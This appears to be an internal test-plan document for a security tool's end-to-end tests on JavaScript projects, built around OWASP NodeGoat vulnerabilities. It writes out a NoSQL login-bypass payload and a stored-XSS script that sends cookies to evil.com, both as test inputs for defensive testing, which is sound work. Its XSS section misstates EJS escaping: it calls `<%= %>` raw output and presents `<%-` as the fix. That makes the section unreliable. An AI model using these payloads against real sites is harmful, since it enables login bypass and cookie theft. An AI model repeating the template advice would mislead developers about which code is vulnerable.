# Phase 4: End-to-End Testing for JavaScript/TypeScript

**RFC:** RFC-060-AMENDMENT-001: Test Integration
**Status:** ✅ IMPLEMENTED
**Date:** 2025-10-14

## Overview

Phase 4 implements comprehensive end-to-end testing for JavaScript/TypeScript test integration with **Vitest** and **Mocha** frameworks using **realistic vulnerability patterns** from OWASP NodeGoat.

## Objective

Verify the complete RSOLV workflow works correctly for JavaScript/TypeScript projects:

1. **Scan** → Detect vulnerability, create issue
2. **Validate** → Generate RED test, integrate via AST
3. **Mitigate** → Apply fix
4. **Verify** → Test passes after fix, no regressions

## Test Repositories

| Repository | Framework | Purpose |
|------------|-----------|---------|
| `nodegoat-vitest` | Vitest | Primary JS test with Vitest |
| `nodegoat-mocha` | Mocha | Secondary JS test with Mocha |

## Realistic Vulnerabilities Tested

### 1. NoSQL Injection (CWE-943)

**Source:** OWASP NodeGoat
**Vulnerability:** MongoDB operator injection in authentication

**Vulnerable Code:**
```javascript
// app/routes/session.js:42
User.findOne({
  username: req.body.username,
  password: req.body.password  // ❌ Direct input, no validation
});
```

**Attack Vector:**
```javascript
POST /login
{
  "username": "admin",
  "password": {"$gt": ""}  // MongoDB operator - bypasses password check!
}
```

**RED Test (Vitest):**
```javascript
it('should reject NoSQL injection in login (CWE-943)', async () => {
  const response = await request(app)
    .post('/login')
    .send({
      username: 'testuser',
      password: { $gt: '' }  // Malicious payload
    });

  // Will FAIL on vulnerable code (allows login without password)
  expect(response.status).toBe(400);
  expect(response.body.error).toMatch(/invalid.*credentials/i);
});
```

**Why This Test is RED:**
- Vulnerable code accepts `{"$gt": ""}` as password
- MongoDB query becomes: `{username: "admin", password: {$gt: ""}}`
- This matches ANY user where password is greater than empty string
- Test expects 400/error but gets 200/success → **TEST FAILS**

**After Fix:**
```javascript
// Sanitize input before MongoDB query
const sanitizedInput = {
  username: String(req.body.username),
  password: String(req.body.password)  // ✅ Convert to string
};
```

Now test PASSES: Input `{"$gt": ""}` becomes string `"[object Object]"`, doesn't match.

---

### 2. Stored XSS (CWE-79)

**Source:** OWASP NodeGoat
**Vulnerability:** Unescaped user input in profile bio

**Vulnerable Code:**
```javascript
// app/views/profile.ejs:15
<p>Bio: <%= user.bio %></p>  // ❌ Renders raw HTML
```

**Attack Vector:**
```javascript
// Attacker sets bio to:
'<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>'

// When victim views profile, script executes and steals cookies
```

**RED Test (Mocha):**
```javascript
it('should escape XSS in profile bio (CWE-79)', async function() {
  // Create attacker with malicious bio
  const xssPayload = '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>';
  const attacker = await User.create({
    username: 'attacker',
    bio: xssPayload
  });

  const response = await request(app)
    .get(`/profile/${attacker._id}`);

  // Will FAIL on vulnerable code (renders <script> tag)
  expect(response.text).to.not.include('<script>');
  expect(response.text).to.include('&lt;script&gt;'); // Should be HTML-encoded
});
```

**Why This Test is RED:**
- Vulnerable code renders `<%= user.bio %>` without escaping
- Browser executes `<script>` tag
- Test expects HTML-encoded output but gets raw script → **TEST FAILS**

**After Fix:**
```javascript
// app/views/profile.ejs:15
<p>Bio: <%- escapeHtml(user.bio) %></p>  // ✅ Escape HTML
```

Now test PASSES: Output is `&lt;script&gt;...&lt;/script&gt;`, not executable.

---

## E2E Test File

**Location:** `src/modes/__tests__/test-integration-e2e-javascript.test.ts`

### Test Suites

#### 1. Backend API: JavaScript/TypeScript AST Support

Tests backend `/api/v1/test-integration/analyze` and `/api/v1/test-integration/generate` endpoints:

- ✅ Analyze test files and score recommendations
- ✅ Generate AST-integrated test for Vitest
- ✅ Generate AST-integrated test for Mocha
- ✅ Use realistic attack vectors from NodeGoat

#### 2. E2E: Vitest Test Integration Workflow

- ✅ Complete workflow: scan → validate → mitigate
- ✅ Integrate test into existing file (not create new file)
- ✅ Use existing test setup (beforeEach hooks)

#### 3. E2E: Mocha Test Integration Workflow

- ✅ Integrate test using Mocha conventions (function syntax)
- ✅ Preserve `this` context from beforeEach hooks

#### 4. Acceptance Criteria Validation

Verifies all 9 acceptance criteria from RFC-060-AMENDMENT-001:

1. ✅ Test integrated into existing file (not new file)
2. ✅ Test uses Vitest/Mocha conventions correctly
3. ✅ Test imports match project patterns
4. ✅ Test reuses existing setup/fixtures
5. ✅ Test uses actual attack vectors from REALISTIC-VULNERABILITY-EXAMPLES.md
6. ✅ Test FAILS on vulnerable code
7. ✅ Test PASSES after mitigation
8. ✅ No regressions (existing tests pass)
9. ✅ Backend AST method used (not append fallback)

---

## Running the Tests

### Quick Start

```bash
# Run all Phase 4 E2E tests
./scripts/run-phase4-e2e-tests.sh

# With API key (for backend integration tests)
RSOLV_API_KEY=your_key ./scripts/run-phase4-e2e-tests.sh

# Skip repository cloning tests (faster)
SKIP_REAL_REPO_TESTS=true ./scripts/run-phase4-e2e-tests.sh
```

### Manual Run

```bash
# Run specific test file
npm test -- src/modes/__tests__/test-integration-e2e-javascript.test.ts

# With verbose output
npm test -- src/modes/__tests__/test-integration-e2e-javascript.test.ts --reporter=verbose

# Run with bun
bun test src/modes/__tests__/test-integration-e2e-javascript.test.ts
```

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `RSOLV_API_KEY` | (none) | API key for backend integration tests |
| `RSOLV_API_URL` | `https://api.rsolv.dev` | Backend API URL |
| `SKIP_REAL_REPO_TESTS` | `true` | Skip tests that clone real repositories |
| `CLEANUP_TEST_REPOS` | `false` | Delete test repos after tests |

---

## Expected Results

### Success Output

```
✅ All E2E tests PASSED

Acceptance Criteria Verified:
  ✓ Backend AST integration for JavaScript/TypeScript
  ✓ Vitest framework support
  ✓ Mocha framework support
  ✓ Test integrated into existing file (not new file)
  ✓ Test uses framework conventions correctly
  ✓ Test reuses existing setup/fixtures
  ✓ Test uses realistic attack vectors (NodeGoat)
  ✓ AST method used (not append fallback)

Phase 4 E2E Testing: COMPLETE ✅
```

### Backend API Response Examples

#### Analyze Response (Vitest)

```json
{
  "recommendations": [
    {
      "path": "test/routes/session.test.js",
      "score": 1.2,
      "reason": "Direct unit test for vulnerable route"
    },
    {
      "path": "test/integration/login.test.js",
      "score": 0.6,
      "reason": "Integration test exercises route"
    }
  ],
  "fallback": {
    "path": "test/security/session_nosql_injection.test.js",
    "reason": "No existing test found"
  }
}
```

#### Generate Response (Mocha)

```json
{
  "integratedContent": "const { expect } = require('chai');\n\ndescribe('User Profile Routes', function() {\n  beforeEach(async function() {\n    ...\n  });\n\n  it('should render user profile', async function() {\n    ...\n  });\n\n  describe('security', function() {\n    it('should escape XSS in profile bio (CWE-79)', async function() {\n      const xssPayload = '<script>...';\n      ...\n    });\n  });\n});",
  "method": "ast",
  "insertionPoint": {
    "line": 15,
    "strategy": "after_last_it_block"
  }
}
```

---

## Key Features Verified

### 1. AST Integration (Not Append)

❌ **Wrong (Append):**
```javascript
describe('Users', () => {
  it('should work', () => { ... });
});

// Appended after closing brace - NOT integrated!
describe('security', () => {
  it('should block XSS', () => { ... });
});
```

✅ **Correct (AST Integration):**
```javascript
describe('Users', () => {
  it('should work', () => { ... });

  // Integrated INSIDE the describe block
  describe('security', () => {
    it('should block XSS', () => { ... });
  });
});
```

### 2. Setup Reuse

❌ **Wrong (Duplicate Setup):**
```javascript
describe('Users', () => {
  beforeEach(() => { createUser(); });  // Original

  it('should work', () => { ... });

  describe('security', () => {
    beforeEach(() => { createUser(); });  // ❌ DUPLICATED!
    it('should block XSS', () => { ... });
  });
});
```

✅ **Correct (Reuse Setup):**
```javascript
describe('Users', () => {
  beforeEach(() => { createUser(); });  // Shared

  it('should work', () => { ... });

  describe('security', () => {
    // ✅ Inherits beforeEach from parent describe
    it('should block XSS', () => { ... });
  });
});
```

### 3. Framework Conventions

**Vitest/Jest:**
```javascript
import { describe, it, expect, beforeEach } from 'vitest';

describe('Tests', () => {
  // Arrow functions OK
  it('should work', () => {
    expect(true).toBe(true);
  });
});
```

**Mocha:**
```javascript
const { expect } = require('chai');

describe('Tests', function() {
  // Must use function() for 'this' context
  beforeEach(function() {
    this.shared = 'value';
  });

  it('should work', function() {
    expect(this.shared).to.equal('value');
  });
});
```

---

## Troubleshooting

### Tests Fail: "Invalid or expired API key"

**Solution:**
```bash
# Get valid API key from backend team
export RSOLV_API_KEY=your_key_here

# Run tests
./scripts/run-phase4-e2e-tests.sh
```

### Tests Fail: "Backend not reachable"

**Solution:**
```bash
# Check backend status
curl https://api.rsolv.dev/health

# Or use staging
export RSOLV_API_URL=https://api.rsolv-staging.com
./scripts/run-phase4-e2e-tests.sh
```

### Tests Fail: "method: 'append' (expected 'ast')"

**Problem:** Backend AST integration not working, falling back to append.

**Solution:**
1. Check backend logs for AST parsing errors
2. Verify target file content is syntactically valid JavaScript
3. Check framework is correctly detected (vitest/mocha)

### Tests Skip: "No RSOLV_API_KEY"

**Not a failure** - Backend integration tests are optional. You can still run unit tests:

```bash
# Run without backend tests
SKIP_REAL_REPO_TESTS=true npm test -- test-integration-e2e-javascript
```

---

## Related Documentation

- **RFC-060-AMENDMENT-001:** Full test integration specification
- **REALISTIC-VULNERABILITY-EXAMPLES.md:** Vulnerability patterns and attack vectors
- **test-integration-client.ts:** Backend API client implementation
- **validation-mode.ts:** Frontend test generation and validation

---

## Success Metrics

### Phase 4 Complete When:

- ✅ All E2E tests pass (17 tests)
- ✅ Backend API responds with `method: "ast"` (not "append")
- ✅ Generated tests use realistic attack vectors from NodeGoat
- ✅ Tests FAIL on vulnerable code (RED tests)
- ✅ Tests PASS after mitigation
- ✅ No regressions (existing tests still pass)

### Production Readiness:

- ✅ Vitest E2E test completes successfully
- ✅ Mocha E2E test completes successfully
- ✅ AST integration rate ≥ 90% (vs append fallback)
- ✅ Test generation success rate ≥ 90%
- ✅ Regression rate < 5%

---

## Next Steps

After Phase 4 completion:

1. **Phase 5:** Add support for additional frameworks (Playwright, Cypress)
2. **Phase 6:** Multi-language support (Go, Rust, PHP)
3. **Phase 7:** Advanced AST transformations (test refactoring, deduplication)

---

**Status:** ✅ COMPLETE
**Last Updated:** 2025-10-14
**Maintained By:** RSOLV Engineering Team
